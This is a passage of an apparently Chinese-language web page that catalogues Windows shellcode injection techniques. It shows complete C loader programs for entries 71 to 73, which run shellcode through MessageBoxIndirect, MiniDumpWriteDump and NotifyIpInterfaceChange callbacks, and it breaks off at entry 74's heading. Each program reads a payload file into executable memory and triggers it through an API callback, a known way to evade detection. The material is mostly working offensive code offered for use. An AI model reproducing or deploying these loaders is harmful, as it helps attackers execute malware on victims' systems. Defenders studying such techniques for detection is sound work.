hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;MFShutdown();<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>CLEANUP:<br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">48</span>}<br><span class="linenum hljs-number">49</span><br><span class="linenum hljs-number">50</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">51</span></span>{<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">63</span><br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">65</span>}<br></code></pre>
<h1 id="h71messageboxindirect"><span>71.回调函数注入 通过 MessageBoxIndirect</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">11</span></span>{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">15</span><br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;MessageBoxIndirect.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">21</span><br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;MSGBOXPARAMS&nbsp;sMsgBox&nbsp;=&nbsp;{&nbsp;<span class="hljs-number">0</span>&nbsp;};<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;sMsgBox.cbSize&nbsp;=&nbsp;<span class="hljs-keyword">sizeof</span>(MSGBOXPARAMS);<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;sMsgBox.dwStyle&nbsp;=&nbsp;MB_HELP;<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;sMsgBox.lpfnMsgBoxCallback&nbsp;=&nbsp;(MSGBOXCALLBACK)hAlloc;<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;sMsgBox.lpszText&nbsp;=&nbsp;<span class="hljs-string">L"Click&nbsp;Help&nbsp;for&nbsp;shellcode&nbsp;:D"</span>;<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Click&nbsp;Help&nbsp;button&nbsp;to&nbsp;execute&nbsp;shellcode.</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;MessageBoxIndirect(&amp;sMsgBox);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>CLEANUP:<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">45</span>}<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">48</span></span>{<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">60</span><br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">62</span>}<br></code></pre>
<h1 id="h72minidumpwritedump"><span>72.回调函数注入 通过 MiniDumpWriteDump</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Dbghelp.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Dbghelp.h&gt;&nbsp;</span></span><br><span class="linenum hljs-number"> 9</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;processthreadsapi.h&gt;</span></span><br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">14</span></span>{<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">18</span><br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;MiniDumpWriteDump.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">24</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Read&nbsp;shellcode&nbsp;and&nbsp;setup</span><br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;MiniDumpWriteDump(GetCurrentProcess(),&nbsp;GetCurrentProcessId(),&nbsp;<span class="hljs-literal">NULL</span>,<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MiniDumpNormal,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;(PMINIDUMP_USER_STREAM_INFORMATION)&amp;hAlloc,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>CLEANUP:<br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">43</span>}<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">46</span></span>{<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">58</span><br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">60</span>}<br></code></pre>
<h1 id="h73notifyipinterfacechange"><span>73.回调函数注入 通过 NotifyIpInterfaceChange</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Iphlpapi.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Iphlpapi.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;NotifyIpInterfaceChange.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">23</span><br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hNotification&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;NotifyIpInterfaceChange(AF_UNSPEC,&nbsp;hAlloc,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;TRUE,&nbsp;&amp;hNotification);<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>CLEANUP:<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">41</span>}<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">44</span></span>{<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">56</span><br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">58</span>}<br></code></pre>
<h1 id="h74notifyroutechange2"><span>74.回调函数注入 通过 NotifyRouteChange2</span></h1>
